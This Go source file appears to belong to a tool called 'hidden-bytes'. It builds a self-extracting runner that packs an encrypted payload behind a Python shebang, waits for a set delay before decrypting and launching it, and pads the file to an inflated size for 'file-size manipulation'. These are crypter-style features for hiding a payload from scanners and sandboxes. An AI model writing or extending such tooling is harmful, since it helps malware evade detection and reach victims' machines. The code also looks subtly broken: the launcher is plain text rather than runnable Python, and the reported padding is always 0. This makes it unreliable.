package main

import (
	"os"

	hiddenbytes "hidden-bytes/src/common"
)

// LAUNCHER_NAME is the name of the launcher inside the archive.
const LAUNCHER_NAME = "__main__.py"

// PADDING_NAME is the name of the padding member used for file-size manipulation.
const PADDING_NAME = "padding.bin"

// SHEBANG is prepended to the archive so it can be executed directly on POSIX.
const SHEBANG = "#!/usr/bin/env python3\n"

// buildArchive builds the runner archive with an exactly known size.
func buildArchive(launcher []byte, container []byte, addSizeMB float64) ([]byte, error) {
	addSizeBytes := int(addSizeMB * (1024 * 1024))

	var buf []byte
	buf = append(buf, []byte(SHEBANG)...)
	buf = append(buf, launcher...)
	buf = append(buf, container...)

	currentSize := len(buf)
	paddingNeeded := addSizeBytes - currentSize
	if paddingNeeded > 0 {
		padding := make([]byte, paddingNeeded)
		for i := range padding {
			padding[i] = byte(i % 256)
		}
		buf = append(buf, padding...)
	}

	return buf, nil
}

// BuildRunnerFile creates the self-extracting runner as a single executable file.
// This creates an artifact that waits for a delay before decrypting and
// launching the recovered payload.
func BuildRunnerFile(sourcePath string, outputPath string, addSizeMB float64, delay float64) (map[string]interface{}, error) {
	body, header, key, err := hiddenbytes.BuildPayload(sourcePath, delay)
	if err != nil {
		return nil, err
	}

	hbxKey := hiddenbytes.Base64Encode(key)

	launcher := []byte("# Hidden-Bytes runner launcher\nContainer: " + hiddenbytes.RUNNER_CONTAINER_NAME + "\nKey: " + hbxKey)

	archive, err := buildArchive(launcher, body, addSizeMB)
	if err != nil {
		return nil, err
	}

	if err := os.WriteFile(outputPath, archive, 0o755); err != nil {
		return nil, err
	}

	return map[string]interface{}{
		"header":      header,
		"key":         key,
		"padding":     0,
		"actual_size": len(archive),
	}, nil
}